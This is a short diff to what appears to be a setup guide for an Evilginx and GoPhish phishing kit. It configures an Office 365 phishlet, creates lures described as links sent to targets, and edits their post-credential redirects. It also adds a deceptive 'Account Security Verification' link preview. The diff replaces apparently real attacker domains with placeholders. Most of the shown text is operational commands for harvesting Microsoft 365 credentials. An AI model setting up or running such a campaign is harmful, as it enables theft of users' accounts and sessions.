@@ -308,6 +308,7 @@ cp -r redirectors/* ~/.evilginx/redirectors/
 cp -r post_redirectors/* ~/.evilginx/post_redirectors/
 cp -r landing_pages/* ~/.evilginx/landing_pages/
 
+
 # 7. Copy the web UI and GoPhish static assets
 cp -r web ~/.evilginx/web
 cp -r gophish/static ~/.evilginx/static
@@ -377,7 +378,7 @@ This build ships with `o365` (Office 365). Additional phishlets can be added to 
 phishlets
 
 # Configure hostname (e.g., Office 365)
-phishlets hostname o365 asdobeen.com
+phishlets hostname o365 YOUR_DOMAIN
 
 # Enable
 phishlets enable o365
@@ -426,7 +427,12 @@ Lures are the unique links you send to targets.
 lures create o365
 
 # Edit lure to set redirect URL (where they go AFTER fishing)
-lures edit 0 redirect_url https://obrapia.com/smityth/loib/gtpo/gewsc/hblp/services
+lures edit 0 redirect_url YOUR_EXTERNAL_URL
+
+- Change the redirector for a lure:
+  - [lures edit <id> redirector <path>]
+- Change the post-credential redirector:
+  - [lures edit <id> post_redirector <path>]
 
 # (Optional) Set OpenGraph info for nice link previews
 lures edit 0 og_title "Account Security Verification"
